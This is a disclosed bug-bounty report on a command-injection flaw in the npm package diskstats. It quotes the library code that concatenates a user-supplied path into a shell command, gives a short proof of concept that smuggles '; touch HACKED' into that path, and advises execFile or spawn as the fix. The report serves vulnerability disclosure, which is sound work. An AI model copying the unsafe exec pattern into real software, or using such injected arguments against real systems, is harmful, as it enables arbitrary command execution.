# [diskstats] Command Injection via insecure command concatenation

## Report Details
- **Report ID**: 864354
- **URL**: https://hackerone.com/reports/864354
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-05-01T19:55:01.641Z
- **Disclosed**: 2020-07-23T19:11:05.993Z

## Reporter
- **Username**: d3lla
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `Command Injection` issue in the `diskstats` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `diskstats`
**version:** `0.0.2`
**npm page:** `https://www.npmjs.com/package/diskstats`

## Module Description

This library uses df to pull disk information such as free space & inode utilization on your system. This library only works on systems where df is installed and present within your path.

## Module Stats

[2] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

Here's the code which causes the issue:

```javascript
// https://github.com/PhilipSkinner/diskstats/blob/master/lib/stat.js#L44
....
stat.prototype._fetchSpace = function(path) {
	return new Promise((resolve, reject) => {
		this.child_process.exec('df ' + this._ensureAbsPath(path), (err, stdout) => {  // <-- injection
			if (err) {
				return reject(err);
			}			

			return resolve(this._parseResponse(stdout));
		});
	});
};

// https://github.com/PhilipSkinner/diskstats/blob/master/lib/stat.js#L56
stat.prototype._fetchInodes = function(path) {
	return new Promise((resolve, reject) => {
		this.child_process.exec('df -i ' + this._ensureAbsPath(path), (err, stdout) => {  // <-- injection
			if (err) {
				return reject(err);
			}

			return resolve(this._parseResponse(stdout));
		});
	});
};
...
module.exports = function(child_process, path) {
	if (!child_process) {
		child_process = require('child_process');
	}

	if (!path) {
		path = require('path');
	}

	return new stat(child_process, path);
}
```
The `path` parameter is used to build the command that is passed to the `child_process.exec` function without any check.


## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `diskstats` module:
    -  `npm i diskstats`
- create the following PoC JavaScript file (`poc.js`):

```javascript
const diskstats = require('diskstats');
diskstats.check('; touch HACKED', (err, results) => {});

```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F811513}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on `diskstats` module via insecure command concatenation.

## Attachments
- poc_diskstats.mov
